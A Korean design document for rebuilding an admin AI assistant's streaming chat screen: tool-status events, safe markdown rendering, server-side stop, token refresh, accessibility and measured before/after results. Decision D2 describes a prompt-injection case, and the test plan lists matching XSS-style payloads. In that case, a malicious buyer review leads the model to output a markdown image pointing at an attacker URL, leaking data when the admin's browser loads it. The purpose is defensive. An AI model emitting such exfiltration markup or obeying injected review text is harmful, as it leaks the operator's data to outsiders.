# 04. AI 채팅 UX — 프론트가 완성하는 스트리밍 AI 응답 (관리자 어시스턴트)

> **설계 문서(2026-10-03, 착수 전)**. 아래 "현재 상태"는 전부 **이 날짜의 코드를 직접 읽고** 적은 것이며, 결정은 위임 원칙대로 **추천 1개 + 이유**로 적었다.
> 구현이 끝나면 맨 아래 진행표를 채우고, CLAUDE.md §5 · `ex-ai-assistant.md` · 루트 README 의 어시스턴트 서술을 사실대로 바꾼다.
> 다음 문서: [05-buyer-flow-complete.md](./05-buyer-flow-complete.md)(구매자 흐름 완결).

## 0. 한 문장 목표와 이유

**관리자 AI 어시스턴트 채팅 화면을 "응답이 흘러나오기만 하는 화면"에서 "지금 무엇을 하는지 보이고, 읽기 좋고, 끊어도 정직하고, 키보드·스크린리더로도 쓸 수 있는 화면"으로 바꾼다.**

왜 지금인가.

- 어시스턴트의 백엔드(tool use 6종 · SSE · 멀티턴 저장 · PII 마스킹 · eval 루프)는 이미 깊다(`ex-ai-assistant.md` Phase 0~7). 반면 프론트는 화면 1개(`AssistantChat.tsx` 346줄)이고 "동작은 하는" 수준이다. **프론트 지원자의 포트폴리오에서 가장 공들인 기능의 프론트가 가장 얇다.**
- "스트리밍 AI 응답 UI를 어떻게 만들었나"는 프론트 면접에서 실제로 나오는 질문이다. 백엔드를 더 깊게 파는 것(Phase 6b 등)보다 **이 교집합을 채우는 쪽이 프론트 + AI 두 역량을 한 번에 증명**한다.
- 범위가 작다. 화면 1개 + 백엔드 소폭 변경 2건. 그리고 이미 해 둔 측정 방법(`ex-a11y-bundle.md` — axe·키보드·번들 전/후 비교)을 그대로 재사용할 수 있다.

**범위 밖**(이 문서에서 하지 않는 것): 구매자용 챗봇(`ex-ai-assistant.md` Phase 8) · 대화 목록/검색 사이드바 · 답변 재생성(재시도) 버튼(§8 참조) · 답변 복사·피드백 버튼 · LLM 프롬프트·도구 변경 · RN 운영 앱.

---

## 1. 현재 상태 (2026-10-03, 코드 확인)

### 1-1. 구조

| 파일 | 역할 | 비고 |
|---|---|---|
| `frontend/src/app/(admin)/admin/assistant/page.tsx` | 제목 + `<AssistantChat />` | 인라인 스타일 |
| `frontend/src/app/(admin)/admin/assistant/components/AssistantChat.tsx` | 상태·스트림 소비·복원·렌더링 **전부** | 346줄. `style={{}}` 위주, Tailwind 는 반응형 몇 곳만 |
| `frontend/src/service/admin-assistant.ts` | `streamAssistantChat`(async generator, fetch + ReadableStream 으로 SSE `data:` 프레임 파싱) · `fetchConversationMessages` | 생 `fetch` — `authClient` 인터셉터를 타지 않음 |
| `backend/src/admin/assistant/assistant.controller.ts` | `POST /v1/admin/assistant/stream` — `@Res()` 수동 SSE | `JwtAuthGuard + RolesGuard + @Roles(ADMIN)`. `DemoAccountGuard` 없음 → 데모 관리자도 사용 가능 |
| `backend/src/admin/assistant/assistant.service.ts` | `streamChat` — user 저장 → `meta` → LLM 델타 중계 → 완성 후 assistant 저장 → `done` | 와이어 타입 `AssistantStreamEvent`(L32) 는 백엔드 파일 안, 프론트는 같은 모양을 손으로 복제(`admin-assistant.ts` L12) |
| `backend/src/intrastructure/ai/providers/gemini.client.ts` | `generateWithTools` — 최대 5라운드 도구 루프 | `tool_call` 을 yield 한 **뒤** `executeTool` 실행(L217-220) |

**테스트는 0개다.** 어시스턴트 관련 단위·e2e 가 백엔드(`*.spec.ts` 없음, `backend-e2e` 5개 중 없음)·프론트 모두 없다. eval 러너(`backend/eval/`)는 LLM 품질 채점이지 코드 동작 테스트가 아니다.

### 1-2. 이미 잘 되어 있는 것 (유지·면접 재료)

- **EventSource 대신 fetch + ReadableStream** — EventSource 는 GET 전용이고 `Authorization` 헤더를 못 단다. 주석으로 이유까지 남아 있다(`admin-assistant.ts` L3-9).
- **복원 레이스 방지** — 마운트 시 복원 요청이 늦게 도착해도 이미 시작한 대화를 덮지 않게 `interactedRef` 가드(L51-61).
- **"일시 실패"와 "진짜 없음" 구분** — 복원 조회가 401/네트워크면 `null`(id 유지), 200 빈 배열이면 id 폐기(`admin-assistant.ts` L28-50). 만료 토큰으로 유효한 대화를 날리는 사고를 막는다.
- **localStorage 안전 래퍼** — 시크릿 모드에서 throw 해도 대화는 계속(L17-40).
- 모바일 주소창 대응 `100dvh`(L168).

### 1-3. 결함과 빈 곳 (코드로 확인)

| # | 현상 | 근거 | 사용자에게 보이는 것 |
|---|---|---|---|
| G1 | **도구 실행 중 상태가 안 보인다** | 서버가 `tool_call` 을 클라이언트로 보내지 않는다(`assistant.service.ts` L532 주석). 와이어 이벤트는 `meta/text/done/error` 4종 | DB 조회 몇 초 동안 말풍선에 `…`(L258)만 |
| G2 | **마크다운을 렌더링하지 않는다** | `whiteSpace: 'pre-wrap'` 텍스트 그대로(L250). 마크다운 라이브러리 미설치 | LLM 이 쓴 표·목록·굵게가 `\|---\|`, `**` 그대로 |
| G3 | **"중지"가 서버를 멈추지 않는다** | 컨트롤러에 연결 끊김 감지가 없다(`assistant.controller.ts` L67-81). 서비스는 끝까지 돌고 **완성본 전체를 저장**(L541-549) | 중지한 뒤 새로고침하면 **보지 않은 답변 전체가 복원**된다. 다음 턴 history 에도 그 전문이 들어간다. 남은 도구 라운드의 LLM 호출도 계속 나간다(코드상 결론 — §5 "중지 → 서버"에서 실측으로 확정) |
| G4 | **스트리밍 경로에 401 자동 갱신이 없다** | `fetch` 직접 호출(`admin-assistant.ts` L63), `!res.ok` 면 throw(L73). `refreshAccessToken` 은 export 돼 있어 재사용 가능(`axios-http-client.ts` L87) | access(15분) 만료 상태에서 보낸 메시지가 "응답을 받지 못했습니다"로 실패. ⚠ `AuthContext` 의 `/auth/me` 재조회가 먼저 갱신해 가려질 수 있으므로 **착수 시 재현부터**(§6 ①) |
| G5 | **한글 입력 중 Enter 처리 없음** | `handleKeyDown`(L155-161)에 `isComposing` 검사가 없다. 같은 저장소의 `SearchBar.tsx` L25 는 이미 처리한다 | 조합 중인 마지막 글자가 입력창에 남거나 중복 전송될 수 있음(크롬 계열에서 흔한 현상 — **실측으로 확인 후 수정**) |
| G6 | **접근성 처리가 없다** | 파일 안에 `aria-*`·`<label>` 이 0개. 입력창은 placeholder 만 | 스크린리더가 응답을 읽지 않음, 입력창 이름 없음(axe `label` 위반 예상), 전송 후 포커스 위치 불명 |
| G7 | **위로 스크롤해 읽는 중에도 맨 아래로 끌려간다** | 델타마다 `scrollToBottom()`(L104) | 긴 답변을 읽는 도중 화면이 계속 튄다 |
| G8 | **델타마다 전체 리렌더** | 델타 1개 = `setMessages` 1회 + 전체 목록 재렌더 | 지금은 텍스트라 가볍지만 G2(마크다운)를 넣으면 **매 델타마다 전 메시지를 다시 파싱**하게 된다 |
| G9 | **깨진 프레임 하나가 스트림 전체를 끊는다** | `JSON.parse` 에 try 없음(`admin-assistant.ts` L98) | 드문 경우지만 응답이 중간에 끊기고 일반 오류 문구 |
| G10 | **빈 화면에서 무엇을 물어야 할지 모른다** | 안내 문구만(L218-236) | 포트폴리오 방문자(데모 관리자)가 첫 질문에서 막힘 |

---

## 2. 결정 (추천 1개 + 이유)

| # | 결정 | 이유 | 버린 안 |
|---|---|---|---|
| **D1** | 와이어 이벤트에 **`{ type: 'tool'; name: string }` 1종만 추가**한다. 서비스가 `tool_call` 을 받으면 **도구 이름만** 흘리고(인자·결과는 안 보냄), 끝남은 "다음 `text`/`tool`/`done` 이 왔다"로 프론트가 추론한다. 이름 → 한국어 문구("매출 데이터 조회 중")는 **프론트의 표**가 소유, 모르는 이름은 "데이터 조회 중" | `tool_call` 이 실행 **직전**에 오므로(gemini.client L217) "시작" 신호로 정확하다. 끝 이벤트를 따로 만들려면 `executeTool` 콜백 안에서 yield 할 수 없어 구조를 바꿔야 한다. 인자에는 기간·필터가 들어 있어 굳이 브라우저로 보낼 이유가 없다 | `tool_start`/`tool_end` 쌍 — 서비스 구조 변경 대비 이득 없음. 서버가 한국어 문구까지 보내기 — 표시 문구는 UI 의 몫 |
| **D2** | 마크다운은 **`react-markdown` + `remark-gfm`**(표·체크리스트), 원시 HTML 은 렌더링하지 않는 기본값 유지. **이미지는 렌더링하지 않고**(`img` 요소 금지 → 대체 텍스트만), 링크는 `rel="noopener noreferrer"`. **완성된 메시지는 `memo` 로 고정**하고 스트리밍 중인 마지막 메시지만 다시 그린다. 번들은 `/admin/assistant` 라우트에만 들어가는지 전/후 측정(§5) | 직접 만든 파서 + `dangerouslySetInnerHTML` 은 LLM 출력(=외부 입력)을 HTML 로 꽂는 XSS 통로다. react-markdown 은 React 요소로 만들고 HTML 을 기본으로 무시한다. **이미지 금지는 프롬프트 인젝션 대비다**: 리뷰·문의 본문(구매자가 쓴 글)이 `summarize_*` 도구로 LLM 에 들어가므로, 악의적인 리뷰가 모델에게 `![](https://공격자/?d=…)` 를 쓰게 하면 관리자 브라우저가 렌더링하는 순간 그 주소로 요청이 나간다. CSP 가 `img-src 'self' data: https:`(`frontend/next.config.js` L98)라 막아 주지 않는다. 관리자 라우트 전용이라 구매자 번들에는 영향이 없어야 한다(측정으로 확인) | `marked` + DOMPurify — 문자열 HTML 경로라 sanitize 를 잊으면 그대로 XSS. 직접 파서 — 표·중첩 목록에서 무너짐 |
| **D3** | **델타를 `requestAnimationFrame` 단위로 모아 반영**한다(ref 버퍼 → 프레임당 `setState` 1회). `done`·`error`·중지 때는 **버퍼를 즉시 비워 반영**한다 | G8 해소. 마크다운 재파싱 횟수가 "델타 수"에서 "프레임 수(최대 60/초)"로 줄어든다. 사람 눈은 차이를 못 느낀다 | 델타마다 반영(현행) — 마크다운과 합치면 긴 답변에서 버벅임. (버퍼를 비우지 않고 끝내면 중지 직전 몇 글자가 화면에서 빠져, D5 의 "본 것 = 저장된 것"이 깨진다) |
| **D4** | 401 은 **스트림 시작 전에만** 처리한다: 첫 응답이 401 이면 `refreshAccessToken()`(기존 함수, 동시 refresh 1회 보장) → 새 토큰으로 **1회 재시도** → 또 실패면 기존처럼 로그인으로. 복원 조회(`fetchConversationMessages`)도 같은 래퍼를 쓴다 | 인증은 요청 시작 시 한 번만 검사되므로 스트림 도중 만료는 문제가 아니다. 갱신 로직을 새로 만들면 axios 쪽과 "refresh 동시 1회" 규칙이 갈라진다 | 스트리밍을 axios 로 — 브라우저 axios 는 응답 스트림을 점진적으로 못 읽는다 |
| **D5** | **"중지"를 서버까지 전파**한다. 컨트롤러가 `res.on('close')`(응답이 끝나기 전에 닫힘)를 감지해 `AbortController` 를 끊고 → `streamChat(…, signal)` → `LlmClient.generateWithTools({ …, signal })`(선택 인자, 프로바이더 중립인 표준 `AbortSignal`) → Gemini `config.abortSignal` + 라운드 시작 전·도구 실행 전 `signal.aborted` 검사. 중단되면 **그때까지 보낸 텍스트만** 저장하고(빈 문자열이면 저장 안 함 — 기존 오류 경로와 같은 상태), `done` 은 보내지 않는다 | G3 의 두 문제(보지 않은 답변 복원 · 남은 라운드 비용)를 함께 닫는다. 저장 = "사용자가 본 것" 이라 새로고침 후 화면과 history 가 일치한다. ⚠ Gemini SDK 의 `abortSignal` 은 **클라이언트 쪽 취소**라 이미 나간 요청은 과금된다(SDK 타입 주석) — 절감은 "**다음 라운드를 안 연다**" 만큼이라고 정직하게 적는다 | 중단 시 아무것도 저장 안 함 — 화면에 보였던 부분 답변이 새로고침 후 사라져 "버그처럼" 보인다. 중단 표시 컬럼 추가 — 마이그레이션 대비 이득 작음(후속 후보) |
| **D6** | 와이어 타입 `AssistantStreamEvent` 를 **`@shopping-mall/shared` 로 옮긴다.** 백엔드는 `import type` 만(메모리 `ops_public_demo` 함정: 백엔드는 shared 를 **값으로** import 하면 운영 이미지에서 깨진다) | 지금은 백·프론트가 같은 모양을 손으로 복제 중이다(D1 로 한 종류가 늘면 어긋날 자리가 생긴다). 타입만이라 런타임 영향 0 | 복제 유지 + 주석 — 이미 한 번 있던 종류의 실수를 다시 열어 둠 |
| **D7** | 스크린리더 알림은 **"상태만 실시간, 본문은 완성 후 1회"**: 시각적으로 숨긴 `role="status"` 영역이 "응답 생성 중" → "매출 데이터 조회 중" → "응답 완료" 를 알리고, 완료 시 답변 본문을 한 번 읽게 한다. 메시지 목록 자체는 스트리밍 중 `aria-live` 를 걸지 않는다(`aria-busy` 로 표시). **최종 동작은 NVDA 청취로 확정** | 델타마다 live region 을 갱신하면 스크린리더가 "매출, 은, 지난, 주…" 처럼 조각을 읽거나 앞 문장을 끊는다. 상태와 본문을 분리하는 게 채팅 UI 의 일반적 해법 | 목록 전체 `aria-live="polite"` — 조각 읽기 문제. 알림 없음(현행) — 스크린리더 사용자는 응답이 왔는지조차 모름 |
| **D8** | 스크롤은 **"바닥 근처에 있을 때만 따라간다"**(바닥에서 80px 이내). 위로 올라가 있으면 따라가지 않고 "새 응답 ↓" 버튼을 띄운다 | G7 해소. 메신저·ChatGPT 와 같은 기대 동작 | 항상 따라감(현행) / 스트리밍 중 스크롤 잠금 — 읽기를 방해 |
| **D9** | 컴포넌트 분해: **`useAssistantStream` 훅**(메시지·상태·전송·중지·복원 — UI 없음) + `MessageList` · `MessageBubble`(마크다운, memo) · `ToolStatus` · `Composer`(입력·IME·전송/중지) · `EmptyState`(추천 질문 칩). SSE 파싱은 **순수 함수 `parseSseChunk(buffer) → { events, rest }`** 로 뽑아 단위 테스트한다. 스타일은 이 화면 전체를 **Tailwind 로 통일** | 346줄 한 파일에 상태·네트워크·렌더링이 섞여 있다. 훅/순수 함수로 뽑아야 테스트가 가능하다(지금 0개인 이유). 스타일 혼용(`style` 316곳 vs `className` 799곳)은 이 화면부터 정리 | 파일 유지 + 기능만 추가 — 400줄을 넘기고 테스트 불가 상태 유지 |
| **D10** | 빈 화면에 **추천 질문 칩 4개**를 둔다. 문구는 **eval 골든셋(`backend/eval/golden-set.json`)에서 도구 선택이 통과한 질문**에서 고른다(매출·리뷰·문의·감사로그 각 1: "지난달 매출 알려줘" · "부정적인 리뷰들 핵심만 요약해줘" · "아직 답변 안 한 고객 문의 요약해줘" · "최근에 뭔가 수상한 로그인 움직임이 있었는지 봐줘"). ⚠ 상대 기간 질문은 운영 DB 시드 날짜에 따라 "데이터 없음"이 될 수 있어 **운영에서 한 번씩 돌려 보고 확정** | 데모 관리자로 들어온 방문자가 첫 질문에서 막히지 않는다. 골든셋에서 고르면 "잘 되는 질문"이라는 근거가 있다 | 아무 예시 문구 — 시연 중 실패할 수 있음 |

---

## 3. 화면 설계

```
┌────────────────────────────────────────────── /admin/assistant ─┐
│ AI 어시스턴트                                        [새 대화] │
├─────────────────────────────────────────────────────────────────┤
│                                     ┌─────────────────────────┐ │
│                                     │ 지난달 매출 알려줘       │ │  ← user
│                                     └─────────────────────────┘ │
│ ┌───────────────────────────────┐                               │
│ │ ⟳ 매출 데이터 조회 중…         │  ← ToolStatus (D1)            │
│ └───────────────────────────────┘                               │
│ ┌───────────────────────────────────────────┐                   │
│ │ 지난달 매출은 **3,240,000원**입니다.        │  ← MessageBubble  │
│ │ | 일자 | 매출 |                            │    (마크다운, D2) │
│ │ |------|------|  → 실제 표로 렌더링         │                   │
│ └───────────────────────────────────────────┘                   │
│                                        [ 새 응답 ↓ ] ← D8        │
├─────────────────────────────────────────────────────────────────┤
│ <label 숨김>질문 입력</label>                                    │
│ [ 메시지를 입력하세요 (Enter 전송, Shift+Enter 줄바꿈) ] [중지]  │
└─────────────────────────────────────────────────────────────────┘
  sr-only role="status": "매출 데이터 조회 중" → "응답 완료"  (D7)
```

### 3-1. 상태 전이 (`useAssistantStream`)

```
idle ──send──▶ connecting ──meta──▶ streaming ◀──text──┐
                  │  401 → refresh → 재시도 1회 (D4)    │
                  │                     │──tool──▶ tool(name) ──text/tool/done──┘
                  ▼                     ├──done──▶ idle  (status: "응답 완료")
                error ◀──error/네트워크──┤
                                        └──stop──▶ idle  (부분 답변 유지 + "중지됨" 표시, D5)
```

- `tool` 상태에서 다음 `text` 가 오면 `ToolStatus` 는 "완료" 체크로 바뀌어 말풍선 위에 남는다(어떤 데이터를 봤는지의 흔적). 한 답변에 도구가 여러 개면 여러 줄.
- 중지된 답변은 말풍선 아래 작은 회색 "중지됨" 표시. 새로고침 후 복원에서는 표시가 없다(컬럼을 추가하지 않으므로 — D5 버린 안).

### 3-2. 입력창 (`Composer`)

- Enter 전송 / Shift+Enter 줄바꿈 / **조합 중(`e.nativeEvent.isComposing`) Enter 는 무시**(G5, `SearchBar.tsx` 와 같은 방식).
- 시각적으로 숨긴 `<label>` 로 이름 부여(G6). 스트리밍 중 `disabled` 대신 `readOnly` + `aria-disabled` 를 검토한다 — `disabled` 는 포커스를 잃게 만들어 중지 후 다시 입력하려면 클릭해야 한다(**실측 후 결정**).
- 전송 직후 포커스는 입력창에 남고, 중지 버튼은 키보드로 도달 가능(Tab 순서: 입력창 → 중지).

---

## 4. 백엔드 변경 (최소 2건 + 단위 테스트)

| # | 변경 | 파일 | 테스트 |
|---|---|---|---|
| **B-1** | `tool_call` 수신 시 `yield { type: 'tool', name: call.name }`(D1). 와이어 타입은 shared 로 이동(D6) | `assistant.service.ts` L512-533, `shared/src/lib/types/assistant/`(기존 도메인별 폴더 구조 — `types/inquiry/` 등과 같은 모양) | `assistant.service.spec.ts` 신규 — mock `LlmClient` 가 `tool_call → text → done` 을 내면 와이어가 `meta → tool → text → done` 순서인지 |
| **B-2** | 중지 전파(D5): 컨트롤러 `res.on('close')` → `AbortController`; `streamChat` 에 `signal` 인자; `LlmClient.generateWithTools` 에 선택 인자 `signal?: AbortSignal`; Gemini 는 `config.abortSignal` + 라운드·도구 실행 전 검사. 중단 시 부분 텍스트 저장, `done` 생략 | `assistant.controller.ts`, `assistant.service.ts`, `llm-client.interface.ts`, `gemini.client.ts` | 같은 spec — 텍스트 2조각 후 abort 하면 ① 저장된 content 가 2조각 합 ② 다음 라운드의 `generateContentStream` 이 호출되지 않음 ③ `done` 이 없음 |

- `OpsAnalysisService` 도 `generateWithTools` 를 쓰지만 `signal` 은 **선택 인자**라 변경 없음. ops 단위 테스트 무회귀 확인.
- DB 변경 0 · 마이그레이션 0.

---

## 5. 측정 (전/후) — 포트폴리오의 근거

`ex-a11y-bundle.md` 와 **같은 스크립트·같은 조건**으로 수정 전에 한 번, 수정 후에 한 번 잰다. 수치는 추정하지 않고 측정한 것만 적는다.

| 항목 | 방법 | 기대 방향 |
|---|---|---|
| axe 위반 | `scripts/a11y/axe-audit.mjs` 를 관리자 페이지에도 쓸 수 있게 한다. ⚠ 지금 스크립트는 구매자 흐름 6페이지가 고정이고, 시작할 때 장바구니에 상품을 넣는다(`ensureCartItem` — 관리자 계정엔 의미 없음) → **`--admin` 모드**(로그인 계정만 바꾸고 페이지 목록을 `/admin/assistant` 로) 추가. 관리자 화면은 `AdminGuard` 가 `/auth/me` 응답을 기다리므로 주소 직접 진입이 가능하다(구매자 화면의 튕김 버그 `ex-a11y-bundle.md` §3 대상 아님) | 입력창 `label` 등 → 0 |
| 키보드 | `keyboard-walk.mjs` 로 Tab 정지 수·이름 없는 요소·포커스 표시 + 수동: 전송 → 중지 → 다시 입력을 키보드만으로 | 막힘 0 |
| 스크린리더 | NVDA 로 질문 1회(도구 사용 질문) 청취 — 무엇을 어떤 순서로 읽는지 기록 | 수정 전: 아무것도 안 읽음 → 수정 후: 상태 3단계 + 본문 1회 |
| 첫 반응까지 시간 | Playwright 로 전송 클릭 → **화면에 의미 있는 무언가가 처음 바뀐 시각**(수정 전: 첫 `text` / 수정 후: 첫 `tool` 표시). 같은 질문 5회 중앙값. 로컬 백엔드 + 실제 Gemini 키(⚠ 무료 티어 분당 15회 — 5회씩 천천히) | 도구 질문에서 체감 대기 단축 |
| 번들 | `yarn nx build frontend --skip-nx-cache` 라우트 표에서 `/admin/assistant` First Load 와 **구매자 라우트들이 그대로인지**. PowerShell 에서 빌드(`NEXT_PUBLIC_API_URL=/api` — Git Bash 경로 변환 함정) | assistant 만 증가, 나머지 불변. 증가폭이 크면 마크다운 렌더러를 `next/dynamic` 으로 |
| 중지 → 서버 | 도구 2개를 쓰는 질문을 보내고 첫 `tool` 직후 중지 → 백엔드 로그의 라운드 수 · DB 에 저장된 content | 수정 전: 라운드 끝까지·전문 저장 / 수정 후: 다음 라운드 없음·부분 저장 |
| G4·G5 재현 | 401: 개발자도구에서 저장된 access 토큰을 망가뜨린 뒤 전송. IME: 한글 조합 중 Enter | 수정 전 재현 여부를 먼저 기록(재현 안 되면 "예방적 수정"으로 정직하게 적음) |

결과는 이 문서 §11 진행표와, 수치 원본은 `docs/roadmap/a11y/` 옆에 `ai-chat/` 폴더로 남긴다(JSON).

### 5-1. 측정 도구

| 스크립트 | 무엇을 |
|---|---|
| `scripts/a11y/axe-audit.mjs --admin [--ask "질문"]` | 데모 관리자로 로그인해 `/admin/assistant` 를 axe 로. `--ask` 를 주면 응답이 끝난 화면(말풍선 있음)도 한 번 더 |
| `scripts/a11y/keyboard-walk.mjs --admin` | 같은 페이지의 Tab 정지·이름·포커스 표시 |
| `scripts/ai-chat/chat-probe.mjs first-response` | Enter → SSE 프레임 종류별 첫 도착 시각(fetch 응답을 복제해 읽음) + 본문 글자가 처음 바뀐 시각. LLM 실패 회차는 중앙값에서 빼고 따로 기록 |
| `scripts/ai-chat/chat-probe.mjs stop --backend-log <파일>` | 키보드만으로 전송 → Tab 으로 중지 도달 → **백엔드 로그에 첫 `tool 실행:` 이 찍힌 직후** 중지(수정 전/후 같은 시점) → 서버 로그·DB 저장 내용·새로고침 후 화면·포커스 위치 |
| `scripts/ai-chat/chat-probe.mjs bad-token` | 저장된 access 토큰의 서명 끝을 바꾼 뒤 전송(G4) |
| `scripts/ai-chat/route-table.mjs` | 빌드 로그의 라우트 표 → JSON, `--diff` 로 전/후 비교 |

프로브는 화면 구조에 기대지 않는다(`textarea` + 키보드, "중지" 버튼, 본문 글자) — 구조를 분해한 뒤에도 같은 스크립트가 돈다.
조건: 로컬 백엔드(`OPS_PUSH_ENABLED=false node --enable-source-maps dist/main.js`) + 프론트 운영 빌드(`next start`), 데모 관리자, `gemini-3.1-flash-lite`.

### 5-2. 수정 전(before) 실측 — 2026-10-03

| 항목 | 결과 | 원본 |
|---|---|---|
| axe (WCAG 2.1 A/AA) | 빈 화면 **대비 위반 3곳**(안내 문구 `#94a3b8` 2 · 페이지 부제 1), 응답 후 화면 1곳(부제). **`label` 위반은 잡히지 않았다** — axe 는 placeholder 를 이름으로 인정한다(§1-3 G6 의 예상과 다름, `ex-a11y-bundle.md` 주문서 입력칸과 같은 현상) | `axe-before.json` |
| 키보드(정적) | Tab 정지 13(빈 화면에선 "새 대화"·"전송" 이 disabled 라 정지 아님). **입력창에 포커스 표시가 없다**(`outline: none`) 1건. 입력창 이름은 placeholder 뿐 | `keyboard-before.json` |
| 키보드(전송 → 중지 → 재입력) | 전송 직후 포커스가 **`body` 로 빠진다**(입력창 `disabled`) → Tab 1회로 "중지" → 중지 후에도 포커스 `body` → **클릭 없이 다시 입력 불가** | `stop-before.json` `keyboard` |
| 첫 반응까지 | "지난달 매출 알려줘" 성공 5회: 화면 첫 변화 **중앙값 4,187ms**(2,585~6,808). 그동안 화면은 `…` 뿐. `meta` 프레임은 64ms 에 오지만 화면에 쓰이지 않는다. (첫 시도 묶음은 5회 중 2회가 Gemini 503 — 재측정) | `first-response-before.json` |
| 중지 → 서버 | 도구 2개 질문, 첫 도구 실행 직후 중지. 중지 때 화면의 답변 **0자**. 서버는 계속: 도구 2회 실행 · LLM **2라운드** · `[usage]` 로그까지 정상 종료 · **78자 저장** → 새로고침하면 **보지 않은 답변이 나타난다**(G3 확정). 모델이 두 도구를 한 라운드에 같이 요청해 라운드는 2회 | `stop-before.json` |
| G4 (401) | **재현됨**. 토큰을 망가뜨리고 전송 → `POST /api/admin/assistant/stream` 401 → refresh 호출 없음 → "응답을 받지 못했습니다". 화면을 열어 둔 채 access 가 만료된 경우와 같은 조건(실제로 15분을 기다려 보지는 않았다) | `bad-token-before.json` |
| G5 (IME) | **재현 안 됨**(사용자 수동, Chrome, 3회). "매출 알려줘" 의 마지막 글자 조합 중 Enter → 3회 모두 전송 1번 · 보낸 말풍선 "매출 알려줘" 그대로 · 입력창에 남은 글자 없음. → ③ 의 `isComposing` 검사는 **예방적 수정**으로 기록한다(다른 브라우저·IME 는 확인하지 않음) | 수동 |
| 스크린리더(NVDA) | 사용자가 청취했으나 **읽은 내용은 기록되지 않았다**(2026-10-04 "확인 완료"만 전달). before 값이 필요하면 `main`(bd5dbbb)을 빌드해 다시 듣는다 — 코드상으로는 `aria-live`·`role=status` 가 없다 | 수동(미기록) |
| 번들 | `/admin/assistant` 3.17 kB / First Load **226 kB**, 공용 223 kB, 라우트 42개 | `bundle-before.json` |

참고: 로컬 DB 에는 2026년 6월·9월 주문이 없어 답변이 "0원"으로 나온다. 시간·중지 측정에는 영향이 없지만 표가 든 답변은 로컬에서 자연스럽게 나오지 않는다(⑥ 은 mock 응답으로 확인).

---

## 6. 작업 순서 (커밋 단위 — 각 단계가 그 자체로 동작)

| 순서 | 내용 | 확인 |
|---|---|---|
| ① 수정 전 측정 | §5 전 항목 before. 스크립트에 관리자 로그인 옵션·`/admin/assistant` 추가 | before JSON 저장 · G4·G5 재현 여부 기록 |
| ② 구조 분해 (동작 불변) | `parseSseChunk` 순수 함수 + 단위 테스트 → `useAssistantStream` 훅 → 컴포넌트 분해(D9) → Tailwind 통일. **기능 추가 없음** | 프론트 tsc · 파서 테스트(청크 경계에서 프레임이 잘림 / 한 청크에 프레임 여러 개 / `data:` 없는 프레임 / 깨진 JSON 은 건너뛰고 다음 프레임 계속 — G9) · 화면 육안 동일 |
| ③ 입력·인증 결함 | IME(G5) · 숨김 label(G6) · 포커스 유지 · 401 재시도(D4, 복원 조회 포함) | 한글 조합 Enter 정상 · 토큰 망가뜨린 뒤 전송 성공 · 훅 테스트(401 → refresh → 재시도 1회, 두 번째 401 은 재시도 안 함) |
| ④ 백엔드 B-1·B-2 + shared 타입 | §4. `nx build shared` | 백엔드 단위(신규 spec) · ops 단위 무회귀 · 양쪽 tsc · 로컬에서 중지 후 DB 확인 |
| ⑤ 도구 진행 표시 + 빈 화면 칩 | `ToolStatus` · 이름→문구 표 · `EmptyState`(D10) | 도구 질문에서 "조회 중" → 완료 체크 · 모르는 도구 이름 → 기본 문구 |
| ⑥ 마크다운 + 프레임 배칭 | D2 · D3 | 표·목록·굵게 렌더링 · `<script>`·`<img onerror>`·마크다운 이미지 `![](https://…)` 가 든 응답(mock)에서 **요청이 하나도 나가지 않음**(Network 탭) · 긴 답변 스트리밍 중 버벅임 없음(Performance 탭 기록) · 번들 측정 |
| ⑦ 스크롤·스크린리더 | D8 · D7 | 위로 올린 채 스트리밍 → 따라가지 않음 + 버튼 · NVDA 청취 |
| ⑧ 수정 후 측정 + 문서 | §5 after · §11 진행표 · CLAUDE.md §5 · `ex-ai-assistant.md` 에 "프론트 UX" 절 · 루트 README | before/after 표 완성 |

크기: ① 반나절 · ② 1일 · ③ 반나절 · ④ 반나절 · ⑤ 반나절 · ⑥ 반나절~1일 · ⑦ 반나절 · ⑧ 반나절 → **약 4~5일**. ②가 가장 크지만 이후 단계가 전부 그 위에 얹히므로 먼저 한다.

---

## 7. 시연 대본

1. 데모 관리자로 로그인 → AI 어시스턴트. 빈 화면의 추천 질문 칩 "지난달 매출 알려줘" 클릭.
2. 말풍선 위에 "⟳ 매출 데이터 조회 중…" → 체크로 바뀌며 답변이 흘러나온다. 답변 안의 표가 실제 표로 그려진다.
3. 긴 답변이 나오는 동안 위로 스크롤 → 화면이 끌려가지 않고 "새 응답 ↓" 버튼이 뜬다.
4. "부정 리뷰 요약해줘" 전송 직후 **중지** → 부분 답변 + "중지됨". 새로고침 → 화면에 보였던 만큼만 복원된다(수정 전에는 보지 않은 전문이 나타났다).
5. (면접 화면 공유 시) NVDA 를 켜고 같은 질문 — "응답 생성 중 → 리뷰 데이터 조회 중 → 응답 완료" 후 본문을 한 번 읽는다.

---

## 8. 위험과 함정 (미리 적어 두는 것)

- **`react-markdown` 은 ESM 전용**이다. 프론트 jest(`next/jest`)에서 import 하는 테스트를 쓰면 변환 오류가 날 수 있다 → 마크다운 컴포넌트 테스트가 필요하면 `transformIgnorePatterns` 조정, 아니면 훅·파서만 테스트하고 렌더링은 육안·Playwright 로.
- **스트리밍 중 미완성 마크다운** — 표가 반쯤 왔거나 코드펜스가 안 닫힌 상태가 매 프레임 렌더링된다. 깨져 보이는 건 정상이지만 레이아웃이 크게 튀면 "마지막 줄이 표 행이면 그 줄은 텍스트로" 같은 완충을 검토(실측 후).
- **Vercel rewrites → nginx → 백엔드 경로에서 클라이언트 끊김이 전파되는지 확인 필요.** nginx 는 기본값(`proxy_ignore_client_abort off`)이라 끊으면 업스트림도 닫지만, Vercel 프록시 구간은 문서로 확인되지 않았다. 로컬(직결)에서 먼저 확인하고, 운영에서는 백엔드 로그로 실측한다. 전파되지 않으면 운영에서 D5 는 "UI 만 중지"로 남는다 — 그 경우 그대로 적는다.
- **`res.on('close')` 는 정상 종료 때도 발생**한다 → `res.writableEnded` 가 false 일 때만 abort.
- **재시도 버튼을 넣지 않는 이유**: 서버가 user 메시지를 LLM 호출 **전에** 저장한다(`assistant.service.ts` L498). 같은 문장을 다시 보내면 history 에 같은 user 턴이 두 번 쌓인다. 재시도를 제대로 하려면 "마지막 user 턴 재실행" API 가 필요하다 → 범위 밖, 후속 후보.
- **연속 user 턴**: 중단·오류로 assistant 가 저장되지 않으면 다음 요청 history 에 user 턴이 연달아 들어간다. **오늘도 오류 경로에서 이미 생기는 상태**라 새 위험은 아니지만, Gemini 가 이를 어떻게 다루는지는 확인 필요(④에서 한 번 실험).
